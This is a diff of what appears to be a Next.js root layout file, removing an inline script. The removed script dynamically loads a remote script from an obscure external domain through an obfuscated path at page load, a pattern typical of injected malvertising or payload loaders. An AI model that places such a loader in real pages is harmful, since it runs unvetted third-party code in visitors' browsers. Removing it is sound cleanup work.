@@ -109,24 +109,7 @@ export default function RootLayout({
             `,
           }}
         />
-        
-        <script
-          dangerouslySetInnerHTML={{
-            __html: `
-              (function(boyi){
-              var d = document,
-                  s = d.createElement('script'),
-                  l = d.scripts[d.scripts.length - 1];
-              s.settings = boyi || {};
-              s.src = "\\/\\/elaborate-analysis.com\\/bfXfVbs.dzGLlS0YYtWDcw\\/Reqmc9buuZjUtlckWPyTsYC4MN\\/TaUu1PMljZk\\/tXNXjFgl1sNfT_UNzfMdwQ";
-              s.async = true;
-              s.referrerPolicy = 'no-referrer-when-downgrade';
-              l.parentNode.insertBefore(s, l);
-              })({})
-            `,
-          }}
-        />
-        
+                
         <script
           dangerouslySetInnerHTML={{
             __html: `
